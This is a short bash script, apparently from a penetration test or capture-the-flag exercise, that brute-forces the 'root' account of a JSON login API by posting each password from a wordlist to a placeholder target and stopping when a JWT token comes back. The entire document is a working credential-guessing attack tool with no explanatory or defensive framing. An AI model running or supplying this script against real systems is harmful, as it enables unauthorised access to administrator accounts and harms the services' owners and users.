#!/bin/bash

input="wordlist.txt"
while IFS= read -r line
do
	echo "Trying: " $line
	resp=`curl -H "Content-Type: application/json" -X POST -d '{"username": "root","password":"'$line'"}' http://TARGET/api/v2/blah`
	val=`echo $resp | grep "jwt"`
	if [[ $val ]]
	then
	echo "-===========================================-"
	echo "Found password: '"$line"'"
	echo "-===========================================-"
	echo "Response: $resp"
	echo "-===========================================-"
	break
	fi
	
done <"$input"